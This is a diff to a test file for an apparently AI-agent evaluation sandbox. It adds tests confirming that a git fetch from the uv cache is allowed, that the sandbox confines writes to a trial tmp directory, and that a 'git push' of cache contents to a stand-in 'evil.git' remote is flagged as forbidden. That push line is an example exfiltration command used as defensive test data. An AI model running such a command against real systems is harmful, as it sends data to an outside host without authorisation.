@@ -15,7 +15,7 @@ import {
 } from 'node:fs';
 import net from 'node:net';
 import { tmpdir } from 'node:os';
-import { join, dirname } from 'node:path';
+import { basename, join, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { hashDir } from '../../../evals/lib/arm-cache.mjs';
 import {
@@ -207,6 +207,39 @@ describe('simulated remotes', () => {
     assert.deepEqual(r.metadata.sandbox.simulatedCalls, []);
     assert.equal(r.metadata.sandbox.forbiddenCalls.length, 2);
     assert.match(r.error, /forbidden/);
+  });
+});
+
+describe('uv cache git passthrough', () => {
+  it('a fetch of the Serena repo from inside the uv git cache is not a forbidden call', async () => {
+    const cache = join(h.base, '.uv-cache', 'git-v1', 'db');
+    mkdirSync(cache, { recursive: true });
+    h.useFakeClaude({
+      FAKE_CLAUDE_RUN: `cd '${cache}' && git init -q . ; git fetch https://github.com/oraios/serena +HEAD:refs/remotes/o/HEAD; true`,
+    });
+    const r = await h.call({ trialId: 'u1', noCache: true });
+    assert.deepEqual(r.metadata.sandbox.forbiddenCalls, []);
+  });
+
+  it('naming the cache path in a push to another remote is still forbidden', async () => {
+    h.useFakeClaude({
+      FAKE_CLAUDE_RUN: 'git push https://example.com/evil.git /x/.uv-cache/git-v1/y; true',
+    });
+    const r = await h.call({ trialId: 'u2', noCache: true });
+    assert.equal(r.metadata.sandbox.forbiddenCalls.length, 1);
+  });
+
+  it('the profile allows writes only to this trial claude tmp dir', () => {
+    const sb = createTrialSandbox('claudetmp');
+    try {
+      const rule = sandboxProfile(sb)
+        .split('\n')
+        .find(l => l.includes(`/private/tmp/claude-${process.getuid()}/`));
+      assert.ok(rule, 'no claude tmp rule');
+      assert.ok(rule.includes(basename(sb.root)), rule);
+    } finally {
+      rmSync(sb.root, { recursive: true, force: true });
+    }
   });
 });
 
